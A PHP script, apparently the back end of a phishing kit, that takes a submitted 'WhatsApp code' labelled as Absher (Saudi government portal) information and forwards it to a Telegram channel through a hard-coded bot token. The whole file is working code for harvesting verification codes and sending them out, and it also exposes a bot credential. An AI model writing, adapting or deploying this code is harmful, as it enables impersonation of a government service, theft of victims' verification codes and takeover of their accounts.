<?php

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = array(
        "chat_id" => $chatId,
        "text" => $message,
        "parse_mode" => "HTML"
    );
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/json",
            "content" => json_encode($payload)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return json_decode($result, true);
}

// Extracted data from the form
$data = array(
    "كود واتساب" => $_POST['message'],
   
);

// Format the extracted data into a message
$message = "<b>معلومات ابشر</b>\n\n";
foreach ($data as $key => $value) {
    $message .= "<b>{$key}:</b> {$value}\n";
}

// Telegram Bot API credentials
$token = "6873405246:AAEUAS4DF970H6qcFBFQeC4L_N8W4wbjetc";
$chatId = "@moamlat4";

// Send the message to Telegram
$response = sendTelegramMessage($token, $chatId, $message);
print_r($response);

?>

